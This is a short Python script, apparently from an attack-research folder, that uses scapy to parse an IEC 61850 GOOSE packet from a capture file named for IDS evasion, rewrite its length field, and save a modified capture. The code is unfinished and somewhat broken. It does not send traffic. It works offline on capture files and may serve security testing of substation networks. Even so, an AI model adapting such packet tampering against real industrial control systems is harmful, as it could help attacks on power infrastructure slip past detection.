from struct import pack
from scapy.packet import Packet
from scapy.fields import XShortField
from scapy.all import bind_layers
from gooseFunc import *


class GOOSE(Packet):
    name = "GOOSE"
    fields_desc = [
        XShortField("appid", 0),
        XShortField("length", 8),
        XShortField("reserved1", 0),
        XShortField("reserved2", 0),
    ]

    def post_build(self, pkt, payload):
        goose_pdu_length = len(pkt) + len(payload)
        # pkt = pkt[:12] + pack('!H', 33024) + pkt[14:]
        # pkt = pkt[:16] + pack('!H', 35000) + pkt[18:]
        # pkt = pkt[:20] + pack('!H', goose_pdu_length + 10) + pkt[22:]
        pkt = pkt[:2] + pack('!H', goose_pdu_length + 10) + pkt[4:]
        return pkt + payload

packets = rdpcap("Attack codes\goose_exploit\ids_bust_boolean.pcapng")
packet = packets[1]
# Create an instance of GOOSE packet
goose_pkt = GOOSE(packet.load)

# Simulate a payload (you can replace this with your actual payload data)
payload = b""

# Manipulate the packet length using post_build
modified_goose_layer = goose_pkt.post_build(goose_pkt.build(), payload)

pkt = packet.copy()


modified_packet = pkt.load[:20] + modified_goose_layer 

header =  packet.load[:20]
print(header)
# print(goose_pkt)
print(goose_pkt.build())


# Print the modified packet
# print(modified_packet)
print(len(modified_packet))

wrpcap("s6.pcapng", modified_packet)

